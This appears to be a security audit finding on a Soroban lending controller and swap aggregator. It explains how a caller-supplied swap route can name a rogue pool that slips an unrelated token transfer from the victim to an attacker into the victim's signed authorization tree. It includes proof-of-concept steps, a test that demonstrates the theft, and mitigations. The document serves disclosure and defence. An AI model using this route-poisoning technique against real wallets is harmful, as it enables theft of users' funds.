### Title
Malicious swap route can smuggle an unrelated wallet-token transfer into the victim’s signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The strategy path forwards caller-controlled opaque `swap` bytes to the configured router, which resolves venue and pool addresses from that payload without constraining the invoked pool code. A malicious route can therefore place attacker-controlled code below the victim’s `require_auth`; if that code transfers an unrelated token from the victim, Soroban records the transfer as an additional child authorization, and a wallet that signs the poisoned tree authorizes the theft. The controller’s exact controller-token authorization and measured output checks only bound protocol collateral movement, not other token transfers attached to the victim’s authorization.

### Finding Description
`swap_collateral` accepts a raw `swap: Bytes` route and passes it into `process_swap_collateral` after requiring owner or delegate authorization. [1](#0-0)  The strategy authenticates `caller`, loads the account, withdraws collateral, and forwards the caller-supplied `StrategySwap` into the shared router wrapper. [2](#0-1)  `swap_tokens` creates one controller-side authorization for the exact input transfer to the configured router, invokes `execute_strategy`, and subsequently validates only controller input/output balance deltas. [3](#0-2) 

The router derives each hop’s `pool`, `token_in`, and `token_out` from caller-provided route registries and dispatches the selected venue adapter against that payload-named pool. [4](#0-3)  The dispatch layer measures router balances, but it does not prevent the selected pool contract from making a token call that requests the original caller’s authorization. [5](#0-4)  An in-repository adversarial test demonstrates the resulting authorization-tree spoof: a rogue hop pool calling `token.transfer(victim, attacker, amount)` is recorded as a child under the victim’s `swap_collateral` authorization, and enforcing auth succeeds if the victim signs that recorded child. [6](#0-5) 

The same exposure applies to `swap_debt` and `repay_debt_with_collateral`, which also accept caller-controlled route bytes and reach `swap_tokens_or_passthrough`. [7](#0-6)  Direct `execute_strategy` is likewise exposed because it performs `sender.require_auth()` and then executes payload-selected hops. [8](#0-7) 

### Impact Explanation
A victim who signs a simulated malicious route can lose arbitrary balance of any standard token whose `transfer` requires the victim’s authorization, including assets unrelated to the lending position. The theft is not bounded by `amount`, route minimum output, controller residual checks, or final account solvency; the malicious transfer consumes a separate wallet balance while the route can still return sufficient output for the strategy to succeed. [9](#0-8)  The harness PoC transfers the victim’s entire unrelated `WALLET_BALANCE` to an attacker while also crediting the expected swapped collateral. [10](#0-9) 

### Likelihood Explanation
An unprivileged attacker needs only deploy or reference a contract implementing the ABI expected by a selectable venue, encode a route that names it, and convince a victim to sign the simulated transaction. No privileged role, leaked key, protocol parameter change, or oracle manipulation is required. The attack does require victim interaction and wallet approval of an authorization tree containing the unexpected token transfer, matching the UI-spoofing bug class; wallets or clients that reject unexpected child invocations prevent the loss. [11](#0-10) 

### Recommendation
Restrict production strategy routes to governance-reviewed pool addresses or cryptographically bound route manifests rather than allowing arbitrary payload-selected contracts. Independently, clients and wallets must decode the complete simulated authorization tree and reject controller strategies containing any user-authorization child and direct router strategies containing anything other than the single expected input-token transfer. The expected tree should be displayed in decoded form, including token contract, sender, recipient, amount, and venue/pool identity.

### Proof of Concept
1. Deploy `RoguePool`, implementing the selected venue’s swap ABI.
2. During its swap callback, execute `token::Client::new(&unrelated_token).transfer(&victim, &attacker, &victim_balance)`.
3. Encode a controller `swap_collateral` route whose pool address is `RoguePool`, while configuring the rest of the route to return enough output for the strategy’s measured-output and solvency checks.
4. Have the victim invoke `controller::swap_collateral(caller=victim, account_id, current, amount, new, malicious_swap_xdr)`.
5. Simulation records an additional `unrelated_token.transfer(victim, attacker, victim_balance)` child beneath the victim’s `swap_collateral` authorization; signing that tree completes the swap and steals `victim_balance`. [6](#0-5)

### Citations

**File:** contracts/controller/src/lib.rs (L255-333)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
    }

    /// Repays `debt` from `collateral`, netting directly for the same hub asset
    /// (`swap` must be empty) or converting otherwise. `close_position` withdraws
    /// all remaining collateral to the caller, reverting with
    /// `CannotCloseWithRemainingDebt` if any debt remains. Requires owner or
    /// delegate authorization.
    #[when_not_paused]
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
        strategies::repay_debt_with_collateral::process_repay_debt_with_collateral(
            &env,
            &caller,
            RepayWithCollateralParams {
                account_id,
                collateral: &collateral,
                collateral_amount,
                debt: &debt,
                swap: &swap,
                close_position,
            },
        );
    }
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L24-54)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L51-86)
```rust
pub(crate) fn run(env: Env, sender: Address, total_in: i128, payload: StrategyPayload) -> i128 {
    sender.require_auth();

    if total_in <= 0 {
        panic_with_error!(&env, Error::InvalidAmount);
    }

    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

    let input_token = assets.get_unchecked(program.token_in);
    let output_token = assets.get_unchecked(program.token_out);
    let total_min_out = amounts.get_unchecked(program.min_out);
    if total_min_out <= 0 {
        panic_with_error!(&env, Error::SlippageExceeded);
    }

    let router = env.current_contract_address();
    let mut vault = Vault::new(&env);
    let mut tokens_cache: Map<Address, Vec<Address>> = Map::new(&env);

    // Credit the measured delta, not declared `total_in`: a fee-on-transfer
    // input would otherwise draw the shortfall from the fee reserve.
    let credited_in = transfer_amount_measured(
        &env,
        &input_token,
        &sender,
        &router,
        total_in,
        GenericError::AmountMustBePositive,
    );
    vault.deposit(&input_token, credited_in);
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-169)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
                panic_with_error!(ctx.env, Error::ZeroOutput);
            }
            vault.deposit(&hop.token_out, out);
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-56)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };

    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-269)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
